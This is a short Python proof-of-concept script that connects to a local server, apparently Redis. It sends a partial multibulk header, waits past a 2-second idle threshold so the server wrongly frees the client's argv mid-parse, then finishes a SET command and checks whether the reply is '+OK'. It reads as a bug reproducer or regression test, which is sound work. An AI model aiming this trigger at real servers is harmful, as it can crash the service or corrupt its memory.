import socket, sys, time

port = int(sys.argv[1])
s = socket.create_connection(("127.0.0.1", port), timeout=10)

# Send multibulk header only, leaving the client mid-parse (c->argc==0,
# c->multibulklen==3) so that clientsCronFreeArgvIfIdle can wrongly treat
# it as idle after 2s and free/null out c->argv / c->argv_len.
s.sendall(b"*3\r\n")

# wait past the 2-second idle-free threshold (cron runs ~10x/s)
time.sleep(3.5)

# now send the rest of the SET command
s.sendall(b"$3\r\nSET\r\n$3\r\nkey\r\n$1\r\n0\r\n")

s.settimeout(5)
try:
    data = s.recv(4096)
except Exception as e:
    print("POC_RESULT: no response / exception: %r" % (e,))
    sys.exit(1)

print("POC_RESULT: got response: %r" % (data,))
if data == b"+OK\r\n":
    print("POC_RESULT: OK_AS_EXPECTED")
    sys.exit(0)
else:
    print("POC_RESULT: UNEXPECTED_RESPONSE")
    sys.exit(2)
